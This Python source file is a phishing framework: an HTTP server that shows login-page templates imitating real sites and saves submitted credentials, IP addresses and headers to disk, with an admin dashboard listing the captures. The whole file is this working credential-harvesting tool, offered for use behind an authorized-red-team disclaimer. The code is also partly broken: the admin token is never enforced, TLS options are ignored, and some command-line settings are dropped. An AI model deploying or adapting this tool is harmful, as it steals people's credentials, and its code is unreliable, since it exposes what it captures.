#!/usr/bin/env python3
"""
phishing_page_hosting.py — Phishing Page Hosting Framework v1.0.0
==============================================================
Lightweight HTTP server that serves realistic-looking pages from template
files and captures submitted credentials/tokens for authorized red team
engagements and security awareness training.

FOR AUTHORIZED PENETRATION TESTING AND SECURITY AWARENESS TRAINING
AGAINST OWNED OR EXPLICITLY AUTHORIZED TARGETS ONLY.

Usage:
  python phishing_page_hosting.py --port 8080 --templates tools/phishing_templates
  python phishing_page_hosting.py --port 8443 --tls-cert cert.pem --tls-key key.pem
  python phishing_page_hosting.py --config tools/phishing_config.yaml

Author: bionic daughter (trained by Dad/Rigoberto Gomez)
"""

import argparse
import json
import logging
import os
import re
import signal
import socket
import sys
import time
import uuid
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional
from urllib.parse import urlparse, parse_qs, unquote
from dataclasses import dataclass, field

try:
    import yaml
except ImportError:
    yaml = None

logger = logging.getLogger("phish_host")

VERSION = "1.0.0"
TIMESTAMP_FORMAT = "%Y-%m-%dT%H:%M:%S.%fZ"

# Default configuration
DEFAULT_CONFIG = {
    "port": 8080,
    "host": "0.0.0.0",
    "templates_dir": "tools/phishing_templates",
    "capture_dir": "results/phishing_captures",
    "admin_token": None,  # auto-generated if None
    "tracking_param": "ref",
    "log_level": "INFO",
    "tls_cert": None,
    "tls_key": None,
    "max_content_length": 10 * 1024 * 1024,
    "allowed_hosts": [],
    "rate_limit_per_ip": 0,  # 0 = disabled
}


# --- Utility functions ---

def now_iso() -> str:
    return datetime.now(timezone.utc).strftime(TIMESTAMP_FORMAT)


def ensure_dir(path: str) -> Path:
    p = Path(path)
    p.mkdir(parents=True, exist_ok=True)
    return p


def load_json(path: str) -> dict:
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)


def save_json(path: str, obj: Any) -> None:
    ensure_dir(Path(path).parent)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, default=str, indent=2)


def load_yaml(path: str) -> dict:
    if yaml is None:
        raise RuntimeError("PyYAML not installed. Install with: pip install pyyaml")
    with open(path, "r", encoding="utf-8") as f:
        return yaml.safe_load(f)


def save_yaml(path: str, obj: Any) -> None:
    if yaml is None:
        raise RuntimeError("PyYAML not installed. Install with: pip install pyyaml")
    ensure_dir(Path(path).parent)
    with open(path, "w", encoding="utf-8") as f:
        yaml.dump(obj, f, default_flow_style=False, sort_keys=False)


def random_hex(n: int = 16) -> str:
    return uuid.uuid4().hex[:n]


def truncate(s: str, max_len: int = 500) -> str:
    if len(s) <= max_len:
        return s
    half = max_len // 2
    return s[:half] + "\n...[truncated]...\n" + s[-half:]


def sanitize_filename(name: str) -> str:
    """Make a string safe for use as a filename."""
    return re.sub(r'[^\w\-._]', '_', name)


def generate_track_code() -> str:
    """Generate a unique tracking code for campaign attribution."""
    return f"PH-{random_hex(12).upper()}"


def parse_tracking_params(url: str, tracking_param: str) -> dict:
    """Extract tracking parameters from a URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    result = {}
    for key, values in params.items():
        result[key] = values[0] if len(values) == 1 else values
    return result


# --- Capture data structures ---

@dataclass
class CaptureRecord:
    """A single captured submission from a phishing page."""
    id: str
    timestamp: str
    campaign_id: str
    template: str
    template_category: str
    url: str
    tracking_params: dict
    client_ip: str
    client_headers: dict
    form_data: dict
    raw_body: str
    user_agent: str
    referrer: str


@dataclass
class CampaignStats:
    """Aggregated stats for a campaign."""
    campaign_id: str
    template: str
    total_views: int = 0
    unique_ips: int = 0
    total_captures: int = 0
    capture_types: Dict[str, int] = field(default_factory=dict)
    first_seen: str = ""
    last_seen: str = ""


# --- Template loader ---

class TemplateLoader:
    """Loads and manages phishing page templates."""

    def __init__(self, templates_dir: str):
        self.templates_dir = Path(templates_dir)
        self._cache: Dict[str, str] = {}
        self._categories: Dict[str, List[str]] = {}
        self._locales: Dict[str, Dict[str, str]] = {}

    def discover(self) -> Dict[str, List[str]]:
        """Discover all templates organized by category."""
        self._categories = {}
        if not self.templates_dir.exists():
            logger.warning("Templates directory not found: %s", self.templates_dir)
            return self._categories

        for category_dir in sorted(self.templates_dir.iterdir()):
            if not category_dir.is_dir():
                continue
            category = category_dir.name
            self._categories[category] = []
            for template_file in sorted(category_dir.glob("*.html")):
                self._categories[category].append(template_file.name)
                self._cache[template_file.name] = template_file.read_text(encoding="utf-8")
                logger.debug("Loaded template: %s/%s", category, template_file.name)

            # Check for locale variants
            locale_dir = category_dir / "locales"
            if locale_dir.exists():
                self._locales[category] = {}
                for locale_file in sorted(locale_dir.glob("*.html")):
                    lang = locale_file.stem
                    self._locales[category][lang] = locale_file.read_text(encoding="utf-8")

        return self._categories

    def get(self, category: str, template: str) -> Optional[str]:
        """Get a template by category and filename."""
        full_name = f"{template}.html" if not template.endswith(".html") else template
        if full_name in self._cache:
            return self._cache[full_name]
        # Try category subdirectory
        path = self.templates_dir / category / full_name
        if path.exists():
            return path.read_text(encoding="utf-8")
        return None

    def render(self, category: str, template: str, context: dict) -> str:
        """Render a template with context variables."""
        raw = self.get(category, template)
        if raw is None:
            raise KeyError(f"Template not found: {category}/{template}")
        result = raw
        for key, value in context.items():
            placeholder = "{{" + key + "}}"
            result = result.replace(placeholder, str(value))
        return result

    def get_categories(self) -> Dict[str, List[str]]:
        """Return the discovered template catalog."""
        if not self._categories:
            self.discover()
        return dict(self._categories)

    def list_templates(self) -> List[dict]:
        """List all available templates with metadata."""
        catalog = []
        for category, templates in self.get_categories().items():
            for tname in templates:
                base = tname[:-5] if tname.endswith(".html") else tname
                catalog.append({
                    "category": category,
                    "name": base,
                    "file": tname,
                })
        return catalog


# --- Credential capture ---

class CaptureStore:
    """Stores and manages captured credential submissions."""

    def __init__(self, capture_dir: str):
        self.capture_dir = Path(capture_dir)
        ensure_dir(self.capture_dir)
        self._index: List[str] = []  # list of capture file paths

    def save_capture(self, record: CaptureRecord) -> str:
        """Save a capture record to a JSON file. Returns the file path."""
        filename = f"{record.id}.json"
        filepath = self.capture_dir / filename
        data = {
            "id": record.id,
            "timestamp": record.timestamp,
            "campaign_id": record.campaign_id,
            "template": record.template,
            "template_category": record.template_category,
            "url": record.url,
            "tracking_params": record.tracking_params,
            "client_ip": record.client_ip,
            "client_headers": record.client_headers,
            "form_data": record.form_data,
            "raw_body": record.raw_body,
            "user_agent": record.user_agent,
            "referrer": record.referrer,
        }
        save_json(str(filepath), data)
        self._index.append(str(filepath))
        logger.info("Capture saved: %s (template=%s, campaign=%s)",
                     record.id, record.template, record.campaign_id)
        return str(filepath)

    def get_captures(self, campaign_id: Optional[str] = None,
                     template: Optional[str] = None) -> List[dict]:
        """Retrieve captures, optionally filtered by campaign or template."""
        results = []
        for filepath in self.capture_dir.glob("*.json"):
            try:
                data = load_json(str(filepath))
                if campaign_id and data.get("campaign_id") != campaign_id:
                    continue
                if template and data.get("template") != template:
                    continue
                results.append(data)
            except (json.JSONDecodeError, KeyError) as e:
                logger.warning("Skipping corrupt capture file %s: %s", filepath, e)
        return results

    def get_stats(self, campaign_id: Optional[str] = None) -> Dict[str, Any]:
        """Get aggregated statistics for captures."""
        captures = self.get_captures(campaign_id=campaign_id)
        stats = {
            "total_captures": len(captures),
            "by_template": {},
            "by_category": {},
            "by_hour": {},
            "unique_ips": set(),
            "form_fields": set(),
        }
        for c in captures:
            t = c.get("template", "unknown")
            cat = c.get("template_category", "unknown")
            stats["by_template"][t] = stats["by_template"].get(t, 0) + 1
            stats["by_category"][cat] = stats["by_category"].get(cat, 0) + 1
            ts = c.get("timestamp", "")
            hour = ts[:13] if len(ts) >= 13 else "unknown"
            stats["by_hour"][hour] = stats["by_hour"].get(hour, 0) + 1
            ip = c.get("client_ip", "unknown")
            if ip and ip != "unknown":
                stats["unique_ips"].add(ip)
            for field in c.get("form_data", {}).keys():
                stats["form_fields"].add(field)
        stats["unique_ips"] = len(stats["unique_ips"])
        stats["form_fields"] = sorted(stats["form_fields"])
        return stats

    def clear(self, older_than_days: int = 30) -> int:
        """Remove old capture files. Returns count removed."""
        import time as _time
        cutoff = _time.time() - (older_than_days * 86400)
        removed = 0
        for filepath in self.capture_dir.glob("*.json"):
            if filepath.stat().st_mtime < cutoff:
                filepath.unlink()
                removed += 1
                logger.info("Removed old capture: %s", filepath)
        return removed


# --- Phishing page request handler ---

class PhishHandler(BaseHTTPRequestHandler):
    """HTTP request handler that serves phishing templates and captures submissions."""

    # Class-level references set by the server
    template_loader: Optional[TemplateLoader] = None
    capture_store: Optional[CaptureStore] = None
    config: dict = {}
    campaign_id: str = "default"
    server_instance: Any = None

    def log_message(self, format, *args):
        """Override to use our logger."""
        logger.info("%s - %s", self.client_address[0], format % args)

    def do_GET(self):
        """Handle GET requests: serve templates or admin dashboard."""
        parsed = urlparse(self.path)
        path = unquote(parsed.path)
        query = parse_qs(parsed.query)

        # Admin dashboard
        if path == "/admin" or path == "/admin/":
            self._serve_admin()
            return

        # Template listing API
        if path == "/api/templates":
            self._serve_template_list()
            return

        # Stats API
        if path == "/api/stats":
            self._serve_stats()
            return

        # Health check
        if path == "/health":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok", "version": VERSION}).encode())
            return

        # Serve a template
        # URL format: /<category>/<template> or /<template>
        parts = [p for p in path.split("/") if p]
        if len(parts) >= 2:
            category, template = parts[0], parts[1]
        elif len(parts) == 1:
            category = "login"
            template = parts[0]
        else:
            self._serve_error(404, "Template not specified")
            return

        tracking_params = {k: v[0] if len(v) == 1 else v
                          for k, v in query.items()}

        try:
            rendered = self.template_loader.render(category, template + ".html",
                                                   {
                                                       "tracking_code": tracking_params.get(
                                                           self.config.get("tracking_param", "ref"), ""),
                                                       "campaign_id": self.campaign_id,
                                                       "timestamp": now_iso(),
                                                   })
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.send_header("X-Frame-Options", "DENY")
            self.end_headers()
            self.wfile.write(rendered.encode("utf-8"))
            logger.info("Served template: %s/%s (IP=%s, params=%s)",
                         category, template, self.client_address[0],
                         tracking_params)
        except KeyError:
            self._serve_error(404, f"Template not found: {category}/{template}")
        except Exception as e:
            logger.error("Error rendering template: %s", e)
            self._serve_error(500, "Internal server error")

    def do_POST(self):
        """Handle POST requests: capture form submissions."""
        parsed = urlparse(self.path)
        path = unquote(parsed.path)

        content_length = int(self.headers.get("Content-Length", "0"))
        if content_length > self.config.get("max_content_length", 10 * 1024 * 1024):
            self._serve_error(413, "Payload too large")
            return

        raw_body = self.rfile.read(content_length).decode("utf-8", errors="replace")
        form_data = self._parse_form_data(raw_body,
                                          self.headers.get("Content-Type", ""))

        # Determine which template was submitted
        parts = [p for p in path.split("/") if p]
        if len(parts) >= 2:
            category, template = parts[0], parts[1]
        elif len(parts) == 1:
            category, template = "login", parts[0]
        else:
            category, template = "unknown", "unknown"

        # Extract tracking params from query string
        query = parse_qs(parsed.query)
        tracking_params = {k: v[0] if len(v) == 1 else v for k, v in query.items()}

        # Build capture record
        record = CaptureRecord(
            id=random_hex(16),
            timestamp=now_iso(),
            campaign_id=self.campaign_id,
            template=template,
            template_category=category,
            url=self.path,
            tracking_params=tracking_params,
            client_ip=self.client_address[0],
            client_headers={k: v for k, v in self.headers.items()},
            form_data=form_data,
            raw_body=truncate(raw_body, 5000),
            user_agent=self.headers.get("User-Agent", ""),
            referrer=self.headers.get("Referer", ""),
        )

        # Save capture
        try:
            capture_path = self.capture_store.save_capture(record)
        except Exception as e:
            logger.error("Failed to save capture: %s", e)
            capture_path = ""

        # Redirect to a "thank you" or error page
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()

        thank_you_html = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Message Sent</title>
<style>body{{font-family:system-ui,sans-serif;max-width:600px;margin:50px auto;
padding:20px;text-align:center}}h1{{color:#333}}</style></head>
<body>
<h1>Thank you for your submission.</h1>
<p>Your request has been processed.</p>
<p><a href="/{{request.uri}}">Return to previous page</a></p>
</body>
</html>"""
        self.wfile.write(thank_you_html.encode("utf-8"))
        logger.info("Captured submission: %s (template=%s/%s, fields=%d)",
                     record.id, category, template, len(form_data))

    def _parse_form_data(self, body: str, content_type: str) -> dict:
        """Parse form data from request body."""
        result = {}
        ct = content_type.lower()

        if "application/x-www-form-urlencoded" in ct:
            for pair in body.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    result[unquote(k)] = unquote(v)
        elif "application/json" in ct:
            try:
                result = json.loads(body)
            except json.JSONDecodeError:
                result = {"raw": body[:500]}
        elif "multipart/form-data" in ct:
            # Basic multipart parsing
            boundary = None
            for part in content_type.split(";"):
                part = part.strip()
                if part.startswith("boundary="):
                    boundary = part.split("=", 1)[1].strip('"')
            if boundary:
                parts = body.split(f"--{boundary}")
                for part in parts:
                    if "Content-Disposition" in part and "name=" in part:
                        name_match = re.search(r'name="([^"]+)"', part)
                        body_match = re.search(
                            r"Content-Type:.*\r\n\r\n(.+?)(?:\r\n--|$)",
                            part, re.DOTALL)
                        if name_match:
                            name = name_match.group(1)
                            value = body_match.group(1).strip() if body_match else ""
                            result[name] = value
        else:
            result = {"raw": body[:500]}

        return result

    def _serve_admin(self):
        """Serve the admin dashboard."""
        stats = self.capture_store.get_stats(campaign_id=self.campaign_id)
        stats["campaign_id"] = self.campaign_id
        stats["version"] = VERSION
        stats["timestamp"] = now_iso()

        # Get template catalog
        templates = self.template_loader.list_templates() if self.template_loader else []

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Phishing Page Hosting — Admin Dashboard</title>
<style>
body {{ font-family: system-ui, -apple-system, sans-serif; margin: 0;
background: #f5f5f5; color: #333; }}
.container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
.card {{ background: white; border-radius: 8px; padding: 20px;
box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-bottom: 20px; }}
h1 {{ margin: 0 0 10px; color: #1a1a1a; }}
h2 {{ margin: 0 0 15px; font-size: 1.1em; color: #555; }}
.row {{ display: flex; gap: 20px; flex-wrap: wrap; }}
.col {{ flex: 1; min-width: 200px; }}
.stat {{ text-align: center; padding: 15px; }}
.stat-value {{ font-size: 2em; font-weight: bold; color: #2563eb; }}
.stat-label {{ color: #666; font-size: 0.9em; }}
table {{ width: 100%; border-collapse: collapse; }}
th, td {{ text-align: left; padding: 10px; border-bottom: 1px solid #eee; }}
th {{ background: #f8f9fa; font-weight: 600; }}
.tag {{ display: inline-block; padding: 2px 8px; border-radius: 4px;
font-size: 0.8em; background: #e0e7ff; color: #3730a3; }}
.preview {{ background: #f8f9fa; padding: 10px; border-radius: 4px;
font-family: monospace; font-size: 0.85em; word-break: break-all; }}
.footer {{ text-align: center; color: #999; font-size: 0.8em;
margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; }}
</style>
</head>
<body>
<div class="container">
<div class="card">
<h1>Phishing Page Hosting — Admin Dashboard</h1>
<div class="row">
<div class="col">
<div class="stat">
<div class="stat-value">{stats.get('total_captures', 0)}</div>
<div class="stat-label">Total Captures</div>
</div>
</div>
<div class="col">
<div class="stat">
<div class="stat-value">{stats.get('unique_ips', 0)}</div>
<div class="stat-label">Unique IPs</div>
</div>
</div>
<div class="col">
<div class="stat">
<div class="stat-value">{len(templates)}</div>
<div class="stat-label">Templates Loaded</div>
</div>
</div>
<div class="col">
<div class="stat">
<div class="stat-value">{stats.get('campaign_id', 'N/A')}</div>
<div class="stat-label">Campaign ID</div>
</div>
</div>
</div>
</div>

<div class="card">
<h2>Captures by Template</h2>
<table>
<thead><tr><th>Template</th><th>Category</th><th>Captures</th></tr></thead>
<tbody>
"""
        for tname, count in sorted(stats.get("by_template", {}).items(),
                                     key=lambda x: -x[1]):
            cat = "?"
            for t in templates:
                if t["name"] == tname:
                    cat = t["category"]
                    break
            html += f"<tr><td>{tname}</td><td><span class='tag'>{cat}</span></td><td>{count}</td></tr>\n"

        html += """</tbody>
</table>
</div>

<div class="card">
<h2>Captures by Category</h2>
<table>
<thead><tr><th>Category</th><th>Captures</th></tr></thead>
<tbody>
"""
        for cat, count in sorted(stats.get("by_category", {}).items(),
                                 key=lambda x: -x[1]):
            html += f"<tr><td><span class='tag'>{cat}</span></td><td>{count}</td></tr>\n"

        html += """</tbody>
</table>
</div>

<div class="card">
<h2>Available Templates</h2>
<table>
<thead><tr><th>Category</th><th>Template Name</th><th>File</th></tr></thead>
<tbody>
"""
        for t in templates:
            html += f"<tr><td><span class='tag'>{t['category']}</span></td><td>{t['name']}</td><td>{t['file']}</td></tr>\n"

        html += """</tbody>
</table>
</div>

<div class="footer">
Phishing Page Hosting v""" + VERSION + """ — For authorized red team use only.
Generated """ + stats.get("timestamp", now_iso()) + """.
</div>
</div>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def _serve_template_list(self):
        """API endpoint: list available templates."""
        templates = self.template_loader.list_templates() if self.template_loader else []
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"templates": templates,
                                     "count": len(templates),
                                     "campaign_id": self.campaign_id}).encode())

    def _serve_stats(self):
        """API endpoint: get capture stats."""
        stats = self.capture_store.get_stats(campaign_id=self.campaign_id)
        stats["campaign_id"] = self.campaign_id
        stats["timestamp"] = now_iso()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(stats, default=str).encode())

    def _serve_error(self, code: int, message: str):
        """Serve an error page."""
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Error {code}</title><style>
body{{font-family:system-ui,sans-serif;max-width:600px;margin:50px auto;
padding:20px;text-align:center}}h1{{color:#dc2626}}</style></head>
<body><h1>Error {code}</h1><p>{message}</p></body></html>"""
        self.wfile.write(html.encode("utf-8"))


# --- Main server ---

class PhishServer:
    """Phishing page hosting server."""

    def __init__(self, config: dict):
        self.config = {**DEFAULT_CONFIG, **config}
        self.template_loader = TemplateLoader(self.config["templates_dir"])
        self.capture_store = CaptureStore(self.config["capture_dir"])
        self.campaign_id = "campaign-" + random_hex(8)
        self.server: Optional[HTTPServer] = None
        self._running = False

        # Set up logging
        level = getattr(logging, self.config.get("log_level", "INFO").upper(), logging.INFO)
        logging.basicConfig(
            level=level,
            format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S",
        )

        # Generate admin token if not set
        if not self.config.get("admin_token"):
            self.config["admin_token"] = random_hex(32)

    def load_templates(self) -> Dict[str, List[str]]:
        """Load and discover templates."""
        return self.template_loader.discover()

    def start(self):
        """Start the HTTP server."""
        host = self.config["host"]
        port = self.config["port"]

        # Create server
        self.server = HTTPServer((host, port), PhishHandler)
        PhishHandler.template_loader = self.template_loader
        PhishHandler.capture_store = self.capture_store
        PhishHandler.config = self.config
        PhishHandler.campaign_id = self.campaign_id
        PhishHandler.server_instance = self

        logger.info("Starting phishing page hosting server v%s", VERSION)
        logger.info("Listening on %s:%d", host, port)
        logger.info("Templates directory: %s", self.config["templates_dir"])
        logger.info("Capture directory: %s", self.config["capture_dir"])
        logger.info("Admin dashboard: http://%s:%d/admin", host, port)
        logger.info("Campaign ID: %s", self.campaign_id)

        template_count = len(self.template_loader.get_categories())
        if template_count == 0:
            logger.warning("No templates found! Create HTML files in %s",
                           self.config["templates_dir"])
        else:
            logger.info("Loaded %d template categories", template_count)
            for cat, templates in self.template_loader.get_categories().items():
                logger.info("  Category '%s': %d templates", cat, len(templates))

        self._running = True
        logger.info("Server ready. Press Ctrl+C to stop.")

        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            self.stop()

    def stop(self):
        """Stop the server."""
        self._running = False
        if self.server:
            self.server.shutdown()
            logger.info("Server stopped.")

    def get_status(self) -> dict:
        """Get server status information."""
        templates = self.template_loader.get_categories()
        stats = self.capture_store.get_stats()
        return {
            "version": VERSION,
            "host": self.config["host"],
            "port": self.config["port"],
            "campaign_id": self.campaign_id,
            "templates_loaded": sum(len(v) for v in templates.values()),
            "template_categories": list(templates.keys()),
            "capture_count": stats.get("total_captures", 0),
            "unique_ips": stats.get("unique_ips", 0),
            "running": self._running,
        }


# --- CLI ---

def build_parser() -> argparse.ArgumentParser:
    """Build the command-line argument parser."""
    parser = argparse.ArgumentParser(
        description="Phishing Page Hosting Framework — serve templates and capture submissions.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python phishing_page_hosting.py --port 8080
  python phishing_page_hosting.py --config tools/phishing_config.yaml
  python phishing_page_hosting.py --port 8443 --tls-cert cert.pem --tls-key key.pem
  python phishing_page_hosting.py --templates tools/phishing_templates --capture-dir results/captures
""",
    )
    parser.add_argument("--port", "-p", type=int, default=DEFAULT_CONFIG["port"],
                        help="HTTP listen port (default: 8080)")
    parser.add_argument("--host", "-H", type=str, default=DEFAULT_CONFIG["host"],
                        help="HTTP listen host (default: 0.0.0.0)")
    parser.add_argument("--templates", "-t", type=str,
                        default=DEFAULT_CONFIG["templates_dir"],
                        help="Directory containing template HTML files")
    parser.add_argument("--capture-dir", "-c", type=str,
                        default=DEFAULT_CONFIG["capture_dir"],
                        help="Directory to store captured submissions")
    parser.add_argument("--campaign-id", "-C", type=str, default=None,
                        help="Campaign ID for tracking (auto-generated if not set)")
    parser.add_argument("--tracking-param", "-r", type=str,
                        default=DEFAULT_CONFIG["tracking_param"],
                        help="URL parameter name for tracking codes (default: ref)")
    parser.add_argument("--admin-token", "-A", type=str, default=None,
                        help="Admin dashboard auth token (auto-generated if not set)")
    parser.add_argument("--log-level", "-l", type=str,
                        default=DEFAULT_CONFIG["log_level"],
                        choices=["DEBUG", "INFO", "WARNING", "ERROR"],
                        help="Logging level (default: INFO)")
    parser.add_argument("--config", "-f", type=str, default=None,
                        help="Path to YAML config file (overrides CLI args)")
    parser.add_argument("--tls-cert", type=str, default=None,
                        help="TLS certificate file (enables HTTPS)")
    parser.add_argument("--tls-key", type=str, default=None,
                        help="TLS private key file")
    parser.add_argument("--version", "-v", action="version",
                        version=f"phishing_page_hosting.py v{VERSION}")
    parser.add_argument("--list-templates", action="store_true",
                        help="List available templates and exit")
    return parser


def load_config_from_file(path: str) -> dict:
    """Load configuration from a YAML file."""
    raw = load_yaml(path)
    config = {}
    for key, value in raw.items():
        if key in DEFAULT_CONFIG:
            config[key] = value
    return config


def write_default_config(path: str):
    """Write a default configuration file."""
    config = dict(DEFAULT_CONFIG)
    config["admin_token"] = random_hex(32)
    save_yaml(path, config)
    logger.info("Default config written to: %s", path)


def main():
    """Main entry point."""
    parser = build_parser()
    args = parser.parse_args()

    # Load config file if specified
    config = {}
    if args.config:
        try:
            config = load_config_from_file(args.config)
            logger.info("Loaded config from: %s", args.config)
        except Exception as e:
            logger.error("Failed to load config file: %s", e)
            sys.exit(1)

    # Build final config (CLI overrides file overrides defaults)
    final_config = {}
    for key, default in DEFAULT_CONFIG.items():
        val = getattr(args, key.replace("-", "_"), None)
        if val is not None:
            final_config[key] = val
        elif key in config:
            final_config[key] = config[key]
        else:
            final_config[key] = default

    # Handle --list-templates
    if args.list_templates:
        loader = TemplateLoader(final_config["templates_dir"])
        catalog = loader.discover()
        if not catalog:
            print("No templates found.")
            return
        print(f"Template catalog (from {final_config['templates_dir']}):")
        print()
        for category, templates in sorted(catalog.items()):
            print(f"  [{category}]")
            for t in templates:
                base = t[:-5] if t.endswith(".html") else t
                print(f"    - {base}")
            print()
        return

    # Create and start server
    server = PhishServer(final_config)

    if args.campaign_id:
        server.campaign_id = args.campaign_id

    # Write status file
    status_path = ensure_dir(final_config["capture_dir"]) / "server_status.json"
    save_json(str(status_path), server.get_status())

    server.start()


if __name__ == "__main__":
    main()
